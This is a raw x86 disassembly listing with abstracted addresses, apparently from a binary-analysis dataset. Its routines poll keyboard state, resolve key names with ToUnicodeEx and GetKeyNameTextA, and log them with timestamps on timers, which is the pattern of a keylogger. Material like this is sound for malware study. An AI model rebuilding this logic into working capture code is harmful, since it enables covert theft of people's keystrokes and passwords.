mov esi [ eax ]
call [ esi + 0xc ]
push [ ebp - 0x64 ]
push r-xdata
lea edx [ ebp - 0x68 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x68 ]
lea eax [ ebp - 0x60 ]
mov edx 0x3
call sub_4051e4
mov ecx [ ebp - 0x60 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_404edc
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404edc
mov edx [ ebp - 0x8 ]
mov eax edx
test eax eax
je r-xdata
inc edx
xor eax eax
cmp eax [ ebp - 0x14 ]
jne r-xdata
sub eax 0x4
mov eax [ eax ]
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x14 ] eax
mov esi edx
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_404edc
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404edc
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + eax - 0x1 ] 0x5c
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x14 ]
inc edx
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_405384
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x14 ]
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405384
sub esi 0x4
mov esi [ esi ]
mov edx [ ebp - 0x4 ]
mov eax edx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + eax - 0x1 ] 0x5c
jne r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_49f334
mov esi edx
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
sub esi 0x4
mov esi [ esi ]
sub_4a3eec
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x38 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4a3fcd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call GetLocalTime
lea eax [ ebp - 0x20 ]
push eax
call GetSystemTime
push r-xdata
lea edx [ ebp - 0x24 ]
movzx eax [ ebp - 0xe ]
call sub_40987c
push [ ebp - 0x24 ]
push r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebp - 0xa ]
call sub_40987c
push [ ebp - 0x28 ]
push r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebp - 0x10 ]
call sub_40987c
push [ ebp - 0x2c ]
push r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebp - 0x8 ]
call sub_40987c
push [ ebp - 0x30 ]
push r-xdata
lea edx [ ebp - 0x34 ]
movzx eax [ ebp - 0x6 ]
call sub_40987c
push [ ebp - 0x34 ]
push r-xdata
lea edx [ ebp - 0x38 ]
movzx eax [ ebp - 0x4 ]
call sub_40987c
push [ ebp - 0x38 ]
push r-xdata
mov eax ebx
mov edx 0xd
call sub_4051e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3fd4
lea eax [ ebp - 0x38 ]
mov edx 0x6
call sub_404e68
retn
sub_4a4034
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x110 ]
push eax
push 0x0
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xfffffefc
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffff00
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x108 ]
push eax
call ToUnicodeEx
pop ebp
retn
sub_4a4074
push ebp
mov ebp esp
add esp 0xfffffeb8
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] eax
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x114 ] eax
mov esi rw-data
lea edi [ ebp - 0x108 ]
xor eax eax
push ebp
push sub_4a4292
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x140 ]
call sub_45de78
mov edx [ ebp - 0x140 ]
mov eax [ esi ]
add eax 0x3bc
call sub_404e98
mov eax [ esi ]
mov eax [ eax + 0x3bc ]
mov edx [ esi ]
mov edx [ edx + 0x3c0 ]
call sub_405270
je r-xdata
push 0x14
call GetKeyState
lea eax [ ebp - 0x100 ]
push eax
call GetKeyboardState
call GetForegroundWindow
lea edx [ ebp - 0x118 ]
push edx
push eax
call __imp_GetWindowThreadProcessId
mov ebx eax
push ebx
call GetKeyboardLayout
mov [ ebp - 0x110 ] eax
xor eax eax
mov [ edi ] eax
mov eax [ esi ]
add eax 0x3c0
mov edx [ esi ]
mov edx [ edx + 0x3bc ]
call sub_404e98
mov eax [ esi ]
push [ eax + 0x3c8 ]
push r-xdata
lea eax [ ebp - 0x144 ]
call sub_4a3eec
push [ ebp - 0x144 ]
mov eax [ esi ]
push [ eax + 0x3bc ]
push r-xdata
mov eax [ esi ]
add eax 0x3c8
mov edx 0x5
call sub_4051e4
inc [ edi ]
cmp [ edi ] 0x100
jne r-xdata
mov eax [ ebp - 0x110 ]
push eax
push 0x0
mov eax [ edi ]
push eax
call MapVirtualKeyExA
mov [ ebp - 0x10c ] eax
push 0x21
lea eax [ ebp - 0x139 ]
push eax
mov eax [ ebp - 0x10c ]
shl eax 0x10
push eax
call __imp_GetKeyNameTextA
lea eax [ ebp - 0x139 ]
push eax
call lstrlenA
dec eax
jle r-xdata
mov eax [ edi ]
call sub_4a4018
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4299
lea eax [ ebp - 0x148 ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x114 ]
call sub_404e44
retn
push ebp
call sub_4a4034
pop ecx
mov ebx eax
lea eax [ ebp - 0x114 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x2
call sub_4050cc
lea eax [ ebp - 0x114 ]
mov edx ebx
call sub_4055ac
mov eax [ esi ]
add eax 0x3c8
mov edx [ ebp - 0x114 ]
call sub_40512c
cmp [ edi ] 0x20
jne r-xdata
cmp [ edi ] 0xd
jne r-xdata
push esi
push edi
mov esi r-xdata
lea edi [ ebp - 0x139 ]
mov ecx 0x8
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x148 ]
lea edx [ ebp - 0x139 ]
mov ecx 0x21
call sub_4050b4
mov edx [ ebp - 0x148 ]
mov eax [ esi ]
add eax 0x3c8
call sub_40512c
jmp r-xdata
push esi
push edi
mov esi r-xdata
lea edi [ ebp - 0x139 ]
mov ecx 0x8
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop edi
pop esi
sub_4a4304
push ebp
mov ebp esp
add esp 0xfffffe78
push ebx
xor eax eax
mov [ ebp - 0x188 ] eax
mov [ ebp - 0x17c ] eax
mov [ ebp - 0x180 ] eax
mov [ ebp - 0x184 ] eax
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x174 ] eax
mov [ ebp - 0x178 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x168 ]
mov edx [ r-xdata ]
call sub_4059d4
xor eax eax
push ebp
push j_sub_4046f8#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0x3d0 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4544
lea eax [ ebp - 0x188 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x180 ]
mov edx 0x2
call sub_405684
lea eax [ ebp - 0x178 ]
call sub_404e44
lea eax [ ebp - 0x174 ]
mov edx 0x2
call sub_405684
lea eax [ ebp - 0x16c ]
call sub_404e44
lea eax [ ebp - 0x168 ]
mov edx [ r-xdata ]
call sub_405aa4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
mov eax [ rw-data ]
mov [ eax + 0x3d0 ] 0x1
xor eax eax
push ebp
push sub_4a44b8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x178 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x178 ]
lea eax [ ebp - 0x174 ]
call sub_4057bc
mov ecx [ ebp - 0x174 ]
mov edx [ rw-data ]
mov edx [ edx ]
lea eax [ ebp - 0x170 ]
call sub_4057e8
mov edx [ ebp - 0x170 ]
lea eax [ ebp - 0x16c ]
call sub_4050e8
mov eax [ ebp - 0x16c ]
lea ecx [ ebp - 0x168 ]
mov edx 0x3f
call sub_409fe0
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x168 ]
call sub_40a054
retn
xor ebx ebx
lea edx [ ebp - 0x184 ]
mov eax [ ebp - 0x154 ]
call sub_40a12c
mov edx [ ebp - 0x184 ]
lea eax [ ebp - 0x180 ]
call sub_4057bc
mov ecx [ ebp - 0x180 ]
mov edx [ rw-data ]
mov edx [ edx ]
lea eax [ ebp - 0x17c ]
call sub_4057e8
mov edx [ ebp - 0x17c ]
lea eax [ ebp - 0x4 ]
call sub_4050e8
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40a164
mov eax [ ebp - 0x4 ]
call sub_409df4
test al al
je r-xdata
test bl bl
je r-xdata
lea edx [ ebp - 0x188 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x188 ]
mov eax [ ebp - 0x8 ]
call sub_405270
jne r-xdata
lea eax [ ebp - 0x168 ]
call sub_40a030
test eax eax
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4a38cc
mov bl 0x1
sub_4a4574
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push j_sub_4046f8#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49f204
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404edc
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d80
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4a461c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_420e5c
mov eax [ ebp - 0xc ]
mov [ eax + 0xc ] 0x0
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_420ec4
lea ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov eax [ ebp - 0xc ]
call sub_421600
mov eax [ ebp - 0xc ]
call sub_420e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4623
mov eax [ ebp - 0xc ]
call sub_403f64
retn
sub_4a4623
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405270
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d80
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push j_sub_4046f8#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_420e5c
mov eax [ ebp - 0xc ]
mov [ eax + 0xc ] 0x0
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_420ec4
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458fd4
mov ecx [ ebp - 0x14 ]
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4215d0
mov eax [ ebp - 0xc ]
call sub_420e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403f64
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458fd4
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_405270
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a470c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4a4713
inc [ edx ]
add [ eax ] al
add [ 0x55000031 ] ch
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
mov ebx rw-data
xor eax eax
push ebp
push sub_4a48ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
call sub_40be08
fstp [ ebp - 0x18 ]
fwait
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40ca08
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_404edc
mov eax [ ebx ]
mov eax [ eax + 0x390 ]
mov edx [ ebp - 0x4 ]
call sub_405270
je r-xdata
call sub_4a4074
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a48f5
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x24 ]
call sub_404e44
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
mov eax [ ebx ]
add eax 0x390
mov edx [ ebp - 0x4 ]
call sub_404e98
mov eax [ ebx ]
inc [ eax + 0x370 ]
mov eax [ ebx ]
mov eax [ eax + 0x370 ]
mov edx [ ebx ]
cmp eax [ edx + 0x3a4 ]
jl r-xdata
mov eax [ ebx ]
inc [ eax + 0x378 ]
mov eax [ ebx ]
mov eax [ eax + 0x378 ]
mov edx [ ebx ]
cmp eax [ edx + 0x3ac ]
jl r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebx ]
mov eax [ eax + 0x3c8 ]
call sub_4093d8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_45dfa8
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x39c
call sub_404e98
call sub_40be08
fstp [ ebp - 0x20 ]
fwait
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
lea eax [ ebp - 0xc ]
xor edx edx
call sub_40ca08
mov eax [ ebx ]
mov ecx [ eax + 0x3cc ]
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
call sub_405170
mov eax [ ebp - 0x34 ]
mov edx [ ebx ]
mov edx [ edx + 0x39c ]
call sub_45e5e0
mov eax [ ebx ]
xor edx edx
mov [ eax + 0x378 ] edx
dec eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebx ]
add eax 0x3c8
call sub_404e44
mov eax [ ebx ]
xor edx edx
mov [ eax + 0x370 ] edx
lea edx [ ebp - 0x2c ]
mov eax r-xdata
call sub_45dfa8
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x39c
call sub_404e98
mov eax [ ebx ]
mov edx [ eax + 0x39c ]
mov eax [ ebx ]
mov eax [ eax + 0x3c8 ]
call sub_45e5e0
mov eax [ ebx ]
mov eax [ eax + 0x378 ]
mov edx [ ebx ]
cmp eax [ edx + 0x3ac ]
jg r-xdata
mov eax [ ebx ]
xor edx edx
mov [ eax + 0x378 ] edx
sub_4a4a0f
inc [ edx ]
add [ eax ] al
add [ ebx + 0x73 ] dh
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx rw-data
xor eax eax
push ebp
push sub_4a4af8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax + 0x37c ]
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4aff
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
dec eax
jne r-xdata
call sub_4a4574
lea edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_45dfa8
mov edx [ ebp - 0x14 ]
mov eax [ ebx ]
add eax 0x39c
call sub_404e98
call sub_40be08
fstp [ ebp - 0x10 ]
fwait
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_40ca08
lea edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x1c ]
push [ ebp - 0x4 ]
mov eax [ ebx ]
push [ eax + 0x3cc ]
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x18 ]
mov edx [ ebx ]
mov edx [ edx + 0x39c ]
call sub_45e5e0
mov eax [ ebx ]
mov [ eax + 0x37c ] 0xffffffff
mov eax [ ebx ]
xor edx edx
mov [ eax + 0x37c ] edx
jmp r-xdata
sub_4a4b33
add [ ebp - 0x75 ] dl
in al dx
mov ecx 0x7
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_4a4d0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov ebx [ eax + 0x380 ]
cmp ebx 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4d15
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_40987c
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
dec eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
mov edx r-xdata
call sub_405170
cmp eax 0x2
jne r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
mov edx r-xdata
call sub_405170
cmp eax 0x3
jne r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x10 ]
call sub_45e504
push [ ebp - 0x10 ]
lea edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4051e4
mov eax [ rw-data ]
push [ eax ]
lea eax [ ebp - 0x20 ]
mov edx [ rw-data ]
mov edx [ edx + 0x3c4 ]
call sub_4057bc
push [ ebp - 0x20 ]
lea edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
call sub_4057bc
push [ ebp - 0x24 ]
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_45ebf0
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0x2c ]
call sub_4057bc
push [ ebp - 0x2c ]
lea edx [ ebp - 0x38 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
call sub_4057bc
push [ ebp - 0x34 ]
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_405858
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x8 ]
call sub_4050e8
mov eax [ ebp - 0x8 ]
call sub_49f094
mov eax [ rw-data ]
inc [ eax + 0x380 ]
mov eax [ rw-data ]
cmp [ eax + 0x380 ] 0x5a
jne r-xdata
lea eax [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
call sub_405170
mov eax [ rw-data ]
mov [ eax + 0x380 ] 0xffffffff
sub_4a4ccb
lea eax [ ebp - 0x38 ]
call sub_404e44
lea eax [ ebp - 0x34 ]
call sub_40566c
lea eax [ ebp - 0x30 ]
call sub_404e44
lea eax [ ebp - 0x2c ]
call sub_40566c
lea eax [ ebp - 0x28 ]
call sub_404e44
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_404e68
retn
sub_4a4d7b
dec [ eax ]
add [ eax ] al
add [ edx ] dh
inc ebp
aaa
xor al 0x36
inc esp
aaa
xor [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi rw-data
xor eax eax
push ebp
push j_sub_4046f8#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
mov ebx [ eax + 0x384 ]
cmp ebx 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4f1d
lea eax [ ebp - 0x2c ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x1c ]
call sub_40566c
lea eax [ ebp - 0x18 ]
call sub_404e44
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_40987c
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
dec eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_405170
cmp eax 0x2
jne r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ rw-data ]
push [ eax ]
lea eax [ ebp - 0x10 ]
mov edx [ esi ]
mov edx [ edx + 0x3c4 ]
call sub_4057bc
push [ ebp - 0x10 ]
lea edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x14 ]
call sub_4057bc
push [ ebp - 0x14 ]
lea eax [ ebp - 0x28 ]
call sub_45e504
push [ ebp - 0x28 ]
mov eax [ esi ]
push [ eax + 0x398 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x2c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x2c ]
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_4051e4
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_45ebf0
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x1c ]
call sub_4057bc
push [ ebp - 0x1c ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x5
call sub_405858
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_4050e8
mov eax [ ebp - 0x4 ]
call sub_49f094
mov eax [ esi ]
inc [ eax + 0x384 ]
mov eax [ esi ]
cmp [ eax + 0x384 ] 0x5
jl r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_405170
mov eax [ esi ]
mov [ eax + 0x384 ] 0xffffffff
sub_4a509c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_4046f8#5
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4031f8
xor edx edx
mov eax [ rw-data ]
call sub_43b830
xor edx edx
mov eax [ rw-data ]
call sub_43b864
mov [ ebx + 0x3a0 ] 0x57e40
mov [ ebx + 0x3a4 ] 0x392
mov [ ebx + 0x3a8 ] 0x311
mov [ ebx + 0x3ac ] 0x4c6
lea edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x3cc ]
call sub_404e98
lea eax [ ebp - 0x8 ]
call sub_45e960
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x3c4 ]
call sub_404e98
xor eax eax
mov [ ebx + 0x370 ] eax
mov edx eax
mov [ ebx + 0x374 ] edx
mov [ ebx + 0x378 ] edx
mov [ ebx + 0x37c ] 0x1
mov [ ebx + 0x380 ] 0xffffffff
mov [ ebx + 0x384 ] 0xffffffff
mov [ ebx + 0x388 ] 0xffffffff
xor eax eax
mov [ ebx + 0x38c ] eax
lea eax [ ebx + 0x390 ]
call sub_404e44
lea eax [ ebx + 0x394 ]
call sub_404e44
lea edx [ ebp - 0x10 ]
mov eax 0x1a
call sub_49e38c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_4093d8
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x3b8 ]
call sub_404e98
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ ebx + 0x3b8 ]
call sub_49e3d8
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4057bc
lea ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebx + 0x3b8 ]
call sub_49e3d8
mov edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_4057bc
call sub_49e634
call sub_49ed20
push 0x4e3
call SetConsoleOutputCP
push 0x4e3
call SetConsoleCP
push 0x0
lea eax [ ebx + 0x3b0 ]
push eax
push 0x0
push 0xa
call SystemParametersInfoA
mov [ ebx + 0x3d0 ] 0x0
push r-xdata
mov eax [ ebx + 0x3b0 ]
test eax eax
jns r-xdata
sar eax 0x2
push eax
push 0x0
push 0x0
call SetTimer
push r-xdata
push 0x3e8
push 0x0
push 0x0
call SetTimer
push r-xdata
mov eax [ ebx + 0x3a0 ]
push eax
push 0x0
push 0x0
call SetTimer
push r-xdata
push 0x9c40
push 0x0
push 0x0
call SetTimer
push r-xdata
push 0x3e8
push 0x0
push 0x0
call SetTimer
push r-xdata
push 0x2bf20
push 0x0
push 0x0
call SetTimer
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a52c3
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_404e68
retn
add eax 0x3
sub_4a54fd
dec dx
add [ eax + 0x462a ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
dec edx
add [ esi + esi * 4 + 0x67e40046 ] dh
dec edx
add [ eax + edi * 4 + 0x46 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
dec dx
add ah dh
dec ebp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
dec edx
add [ eax + 0x280046ea ] ch
push 0xfaf8004a
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x67 ] ah
dec edx
add [ eax ] dh
xchg ecx eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x68 ] dl
dec edx
add [ edx + esi + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax + 0x47f5 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
imul ecx [ edx ] sub_484e94
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
imul ecx [ edx ] sub_485084
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc004a69
inc ecx
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
push 0x4a
add [ ecx + ebp * 4 + 0x48 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
